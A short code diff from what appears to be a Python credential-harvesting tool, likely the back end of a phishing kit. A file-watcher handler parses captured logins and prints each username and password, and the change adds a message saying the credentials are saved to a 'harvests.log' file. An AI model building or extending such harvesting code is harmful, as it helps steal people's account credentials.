@@ -26,7 +26,7 @@ class MyHandler(FileSystemEventHandler):
 			password = credential_data[0].strip('\n').split()[3] 
 			for repeat in range(2):
 					print("\033[A                                                           \033[A")
-			print(f"\n{Fore.GREEN}[*]{Fore.BLUE} Credentials recieved!\n")
+			print(f"\n{Fore.GREEN}[*]{Fore.BLUE} Credentials recieved saved to {Fore.GREEN}{pkg_resources.resource_filename(__name__, f'res/logs/harvests.log')} \n")
 			print(f"{Fore.YELLOW}Username = {Fore.GREEN}{username}\n")
 			print(f"{Fore.YELLOW}Password = {Fore.GREEN}{password}")
 			print(f"\n{Fore.YELLOW}[*]{Fore.BLUE} Watching for credentials to harvest")
